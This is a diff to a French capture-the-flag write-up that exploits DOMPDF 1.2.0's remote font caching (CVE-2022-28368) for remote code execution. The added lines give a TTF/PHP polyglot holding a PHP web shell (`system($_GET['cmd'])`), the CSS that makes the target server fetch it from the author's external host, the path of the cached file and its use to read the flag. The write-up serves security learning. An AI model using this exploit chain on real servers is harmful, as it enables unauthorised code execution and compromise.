@@ -434,11 +434,7 @@ En observant le site du challenge, on remarque la présence d’un formulaire pe
 Avant de tester des attaques côté serveur, il est pertinent d’inspecter le **code source client**, à la recherche de commentaires oubliés, de fonctionnalités internes ou d’indices laissés par les développeurs.
 
 En consultant le JavaScript embarqué dans la page, on tombe sur une fonction inhabituelle : **`getJob()`**.
-La fonction semble volontairement **obfusquée** :
-- mélange de caractères dans une chaîne,
-- substitutions successives,
-- opérations mathématiques sans signification apparente.
-
+La fonction semble volontairement **obfusquée**.
 En l’exécutant localement via Node.js :
 ![[IMG-20251206135000254.png]]
 On obtient:
@@ -468,11 +464,11 @@ On remarque également la version du moteur PDF :
 Cette version est importante : DOMPDF 1.2.0 est affecté par une vulnérabilité critique permettant une **Remote Code Execution** via le mécanisme d’import de polices distantes (CVE-2022-28368).
 DOMPDF peut télécharger une police indiquée dans un fichier CSS, puis la met en cache dans `/lib/fonts/<fontname>_normal_<hash>.php`.
 Le fichier est ensuite interprété par PHP si son extension est `.php`.  Ainsi, en fournissant une fausse police contenant du code PHP valide, il est possible de créer un fichier malveillant dans ce répertoire et de l’exécuter directement depuis le serveur.
-Pour réaliser cette exploit, je me suis aidé de ce article:
+Pour réaliser cette exploit, je me suis aidé de cet article:
 https://www.optiv.com/insights/discover/blog/exploiting-rce-vulnerability-dompdf
 Il explique en détail comment DOMPDF gère les polices distantes, comment elles sont mises en cache sous la forme de fichiers `.php`, et comment détourner ce mécanisme pour exécuter du code sur la machine cible.
 
-Pour mener à bien cet exploit, il faut exposer deux fichiers accessibles depuis l’extérieur, que DOMPDF pourra récupérer grâce au paramètre `remote` ajouté dans la requête. Pour éviter d’ouvrir un port sur ma box ou de mettre en place un serveur local accessible depuis Internet, j’ai choisi de créer une petite application web sur **PythonAnywhere**.
+Pour mener à bien cet exploit, il faut exposer deux fichiers accessibles depuis l’extérieur, que DOMPDF pourra récupérer grâce au paramètre `remote` ajouté dans la requête. Pour éviter d’ouvrir un port sur ma box et de mettre en place un serveur local accessible depuis Internet, j’ai choisi de créer une petite application web sur **PythonAnywhere**.
 
 Cette plateforme me fournit directement un nom de domaine public, ce qui me permet d’héberger mes fichiers malveillants et de laisser DOMPDF les télécharger sans difficulté.
 
@@ -482,6 +478,19 @@ J’y dépose donc deux fichiers essentiels à l’exploitation :
 - **style.css**, qui charge automatiquement la police distante ;
 - **exploit.php**, une version polyglotte servant à la fois de police TTF valide _et_ de payload PHP.
 
+Création de `exploit.php`:
+DOMPDF n’acceptera de télécharger le fichier que s’il ressemble réellement à un fichier `.ttf`.
+Un TTF commence toujours par l’en-tête suivant :`\x00\x01\x00\x00\x00\x10\x00\x80`
+Je l’ajoute donc en première ligne, puis j’insère ma payload PHP :
+
+```
+\x00\x01\x00\x00\x00\x10\x00\x80 
+<?php system($_GET['cmd']); ?>
+```
+
+Création de `style.css`:
+Ce fichier CSS indique à DOMPDF de récupérer ma “fausse police” exploit.php.  
+C’est suffisant pour que le fichier soit téléchargé puis mis en cache côté serveur.
 ```css
 @font-face {
     font-family: 'exploit';
@@ -495,24 +504,31 @@ body {
 }
 ```
 
-Header TTF: \x00\x01\x00\x00\x00\x10\x00\x80
-
-![[IMG-20251206184439106.png]]
-
-
+A présent je génère le PDF avec le paramètre `remote`:
 ![[IMG-20251206184116463.png]]
+Dans le champ _commentaires_, j’injecte une balise `<style>` qui force DOMPDF à charger mon fichier `style.css`.
+Une fois la génération du PDF déclenchée avec le paramètre `remote`, DOMPDF télécharge automatiquement ces deux fichiers depuis mon serveur. Le polyglotte est alors stocké dans la bibliothèque interne des police mais avec l’extension `.php`.  
+On peut également confirmer dans les logs de mon serveur que la machine du challenge est bien venue télécharger `style.css`, puis le fichier `exploit.php`:
+![[IMG-20251206225026943.png]]
 
-![[IMG-20251206184137833.png]]
+À partir de là, l'exploit est en place, il ne reste plus qu’à retrouver le nom sous lequel DOMPDF a enregistré notre “police” et exécuter du code via `?cmd=`.
+Pour cela, la réponse renvoyée par BurpSuite est très utile. On y voit clairement comment le fichier a été enregistré dans le dossier des polices :
+![[IMG-20251206225913305.png]]
+DOMPDF génère toujours ce type de nom en suivant le schéma :
+```
+<fontname>_normal_<md5 du contenu>
+```
 
-![[IMG-20251206184254670.png]]
-
+Pour accéder à notre fichier une fois qu’il a été enregistré par le serveur, il faut déterminer dans quel dossier DOMPDF l’a rangé. En cherchant un peu, on découvre que les polices générées se retrouvent habituellement dans /dompdf/lib/fonts/. Cependant, un indice présent sur la page permet de connaitre le vrai chemin vers le fichier .php.
 ![[IMG-20251206185412714.png]]
+On en déduit donc que notre fichier est accessible via : /librairies/dompdf/lib/fonts/exploit_normal_5e368b03ec49ffe9e308dfca4b8caec6.php.
 
-![[IMG-20251206184311324.png]]
-
+On a ainsi accès à un web shell direct qui nous permet de retrouver le flag sur le server:
 ![[IMG-20251206185246929.png]]
 
 ```
 FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/c2w8i3ydokm6de4x92dogxfwnr9sa1lx-end.html}
 ```
+
 ## Chall 8
+
